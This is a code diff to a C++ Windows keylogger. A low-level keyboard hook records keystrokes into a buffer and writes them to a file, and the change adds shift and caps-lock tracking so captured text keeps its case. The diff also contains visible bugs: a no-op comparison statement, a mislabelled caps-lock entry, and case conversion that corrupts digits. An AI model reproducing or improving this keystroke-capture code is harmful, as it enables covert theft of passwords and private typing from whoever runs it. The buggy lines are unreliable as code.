@@ -4,10 +4,12 @@
 #include <windows.h>
 #include <vector>
 #include <string>
-#include <sstream>
 
 std::string fileName;
 std::vector<std::string> codepointStringBuffer;
+BOOL leftShiftDown = FALSE;
+BOOL rightShiftDown = FALSE;
+BOOL capsLockDown;
 
 static void DumpCharacterBuffer() {
 
@@ -33,8 +35,17 @@ LRESULT CALLBACK KeyboardProc(int nCode,
 
             if (vkCode == VK_LSHIFT) {
                 codepointStringBuffer.push_back(std::string("<VK_LSHIFT up>"));
+                leftShiftDown = FALSE;
             } else if (vkCode == VK_RSHIFT) {
                 codepointStringBuffer.push_back(std::string("<VK_RSHIFT up>"));
+                rightShiftDown = FALSE;
+            } else if (vkCode == VK_LMENU) {
+                codepointStringBuffer.push_back(std::string("<VK_LMENU up>"));
+            } else if (vkCode == VK_RMENU) {
+                codepointStringBuffer.push_back(std::string("<VK_RMENU up>"));
+            } else if (vkCode == VK_CAPITAL) {
+                codepointStringBuffer.push_back(std::string("<VK_CAPITAL up>"));
+                capsLockDown = !capsLockDown;
             }
 
             if (codepointStringBuffer.size() >= 30) {
@@ -48,12 +59,19 @@ LRESULT CALLBACK KeyboardProc(int nCode,
 
             if (vkCode == VK_LSHIFT) {
                 codepointStringBuffer.push_back(std::string("<VK_LSHIFT down>"));
+                leftShiftDown = TRUE;
             } else if (vkCode == VK_RSHIFT) {
                 codepointStringBuffer.push_back(std::string("<VK_RSHIFT down>"));
+                rightShiftDown = TRUE;
+            } else if (vkCode == VK_LMENU) {
+                codepointStringBuffer.push_back(std::string("<VK_LMENU down>"));
+            } else if (vkCode == VK_RMENU) {
+                codepointStringBuffer.push_back(std::string("<VK_RMENU down>"));
             } else if (vkCode == VK_SPACE) {
                 codepointStringBuffer.push_back(std::string(" "));
             } else if (vkCode == VK_CAPITAL) {
-                codepointStringBuffer.push_back(std::string("<CAPS LOCK>"));
+                codepointStringBuffer.push_back(std::string("<VK_CAPITAL up>"));
+                capsLockDown != capsLockDown;
             } else if (vkCode == VK_RETURN) {
                 codepointStringBuffer.push_back(std::string("<RETURN>\n"));
             } else if (vkCode == VK_BACK) {
@@ -63,13 +81,18 @@ LRESULT CALLBACK KeyboardProc(int nCode,
             } else {
                 char ch = (char) vkCode;
 
-                if (std::isalnum(vkCode)) {
-                    std::stringstream ss;
-                    ss << ch;
-                    std::string s;
-                    ss >> s;
-                    codepointStringBuffer.push_back(s);
+                if (leftShiftDown || rightShiftDown || capsLockDown) {
+                    if (std::isalnum(vkCode)) {
+                        std::string s{ch};
+                        codepointStringBuffer.push_back(s);
+                    }
+                } else {
+                    if (std::isalnum(vkCode)) {
+                        std::string s{(char)(ch + 32)};
+                        codepointStringBuffer.push_back(s);
+                    }
                 }
+
             }
 
             if (codepointStringBuffer.size() > 30) {
@@ -84,6 +107,12 @@ int WinMain(HINSTANCE hInstance,
             HINSTANCE hPrevInstance,
             LPSTR pCmdLine,
             int nCmdShow) {
+
+    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
+        capsLockDown = TRUE;
+    } else {
+        capsLockDown = FALSE;
+    }
 
     fileName = pCmdLine;    
 
